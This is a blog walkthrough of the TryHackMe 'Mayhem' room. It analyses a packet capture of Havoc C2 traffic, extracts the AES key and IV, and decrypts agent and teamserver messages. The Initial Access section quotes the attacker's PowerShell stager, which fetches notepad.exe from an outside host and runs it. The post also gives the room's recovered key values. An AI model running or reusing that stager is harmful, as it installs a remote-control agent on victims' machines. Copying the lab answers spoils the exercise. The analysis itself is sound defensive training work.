---
title: TryHackMe Mayhem Write-Up Walk Through
date: 2025-04-21 07:00:00 +0200
categories: [TryHackMe, CTF, TryHackMe Write Up]
tags: [mayhem, c2, Havoc C2 Analysis, Havoc, Wireshark, C2 Communication, ctf]
description: "Can you find the secrets inside the sea of mayhem?"
comments: false
media_subpath: /assets/img/
image:
  path: tryhackme-mayhem.png
  alt: TryHackMe Mayhem
---

# Introduction

The "Mayhem" room on TryHackMe throws you into a sea of Havoc C2 communication! Can you uncover the attacker's secrets hidden within the Wireshark capture? Join us as we trace the initial PowerShell infection, the disguised notepad.exe Havoc agent, and the encrypted communication with the teamserver. We'll guide you through identifying the crucial 0xdeadbeef marker, extracting the AES key and IV, and using our Python script to reveal the plain text client-server interactions. Put your network analysis skills to the test!

**[You can follow YouTube video walk through here](https://youtu.be/mzbbniWCHAw)**

## Initial Access
the attacker started by downloading a powershell script `install.ps1` from his Python local web server, we can export file content from `Wireshark`:

```console
$aysXS8Hlhf = "http://10.0.2.37:1337/notepad.exe";$LA4rJgSPpx = "C:\Users\paco\Downloads\notepad.exe";Invoke-WebRequest -Uri $aysXS8Hlhf -OutFile $LA4rJgSPpx;$65lmAtnzW8 = New-Object System.Net.WebClient;$65lmAtnzW8.DownloadFile($aysXS8Hlhf, $LA4rJgSPpx);Start-Process -Filepath $LA4rJgSPpx
```
We can see the script download a binary `notepad.exe` and run it

Looking at `Virustotal` we will find that this binary is a `Havoc C2` agent (https://github.com/HavocFramework)

**[You can follow YouTube video walk through here](https://youtu.be/mzbbniWCHAw)**

## Havoc Framework 

From Havoc documentation on Github, we found that Havoc agent send response to teamserver using `20 Bytes` header with Magic Value is set to `0xdeadbeef`.

```console
 Header:
    [ SIZE         ] 4 bytes
    [ Magic Value  ] 4 bytes
    [ Agent ID     ] 4 bytes
    [ Request ID   ] 4 bytes
    [ COMMAND ID   ] 4 bytes

 Packed data:
    ... (depends on the COMMAND ID)
```
Using `Wireshark` find packet option, searching for `deadbeef` we found the first packet that contain `AES Key` and `IV`:

<img src="tryhackme-mayhem-havoc-magic-value.png"  alt="TryHackMe Mayhem Havoc Magic Value" >

**[You can follow YouTube video walk through here](https://youtu.be/mzbbniWCHAw)**

We can save hex data value from `Wireshark` for this first packet:

```console
00000113deadbeef0e9fb7d80000006300000000946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca8cd00c3e349290565aaa5a8c3aacd430340cd2bc567802a30e1c2722bb2135dbfe9b76cc0f486e975aaf1f21a6ad13f9ef282131470a0191c974b4f5c2369005227811dcfb9708192e358fe9dfbf4214760291da15237a0f2e5db5b1e718d48ef01af5e724767c95a1b5c136cc744d75edcb1747847d1b6a22df5a23531442b73329c2b2ae46e1ab2506f548bd1b706892c6d4b8c66c206b0a668752ef7203b3e7627cb2fa5677998779347a00d75cadc5e60d67f78e4cbe1318e8d738475d774ae18dbb6ee25e0a3c3255dfe2b0fc3e220e87fd3a5c7bba8ed1df272387b57fd836f0
```

Which will give us the `AES Key` and `IV`

```console
946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca

8cd00c3e349290565aaa5a8c3aacd430
```

We can use for example `CyberChef` to decrypt the packets from client to teamserver, example (note you need to remove the fist `20 bytes` from the header and decrypt only the rest of the text, you can use Drop Bytes option in CyberChef):

<img src="tryhackme-mayhem-havoc-cyberchef.png"  alt="TryHackMe Mayhem Havoc CyberChef" >

**[You can follow YouTube video walk through here](https://youtu.be/mzbbniWCHAw)**

We can follow the same process to decrypt all the rest of packet from client to teamserver.

## Decrypting commands sent by Havoc Teamserver to Client

The process is the same, using the found `AES Key` and `IV` as before, but this time we note the header size is `12 Bytes` and server sent packets are HTTP/1.1 200 OK, example below:

<img src="tryhackme-mayhem-havoc-cyberchef-command.png"  alt="TryHackMe Mayhem Havoc CyberChef server commands" >

as you can see from above image server send `ipconfig` commands to Havoc Agent. you can do same process on `CyberChef` for all the rest of packets.

**[You can follow YouTube video walk through here](https://youtu.be/mzbbniWCHAw)**

## Using Python Script to Automate the process:

```console
(myproject) jalil@jalil-Vostro-460:~/Documents/Tryhackme/Mayhem$ python3 g1.py  --pcap evidence-1700022726858/traffic.pcapng 
[+] Parsing Packets
[+] Parsing Request
[!] No request body found
[+] Parsing Request
[!] No request body found
[+] Parsing Request
[!] No request body found
[+] Parsing Request
[+] Found Havoc C2 Initial Packet
  [-] Agent ID: 0e9fb7d8
  [-] Magic Bytes: deadbeef
  [-] C2 Address: http://10.0.2.37/
  [+] Found AES Key
    [-] Key: 946cf2f65ac2d2b868328a18dedcc296cc40fa28fab41a0c34dcc010984410ca
    [-] IV: 8cd00c3e349290565aaa5a8c3aacd430
[+] Parsing Request
[!] No valid response body found


```

About `Python` script will find the `Key` and the `IV`, decrypt all Havoc C2 communication between Agent and the server.


# Want the Full Walkthrough?

Check out my **[full video walkthrough](https://youtu.be/mzbbniWCHAw)** on my YouTube channel for step-by-step guidance:

**[You can follow YouTube video walk through here](https://youtu.be/mzbbniWCHAw)**

<img src="tryhackme-mayhem-youtube-walk-through2.png"  alt="TryHackMe Mayhem YouTube Video Walk through" >


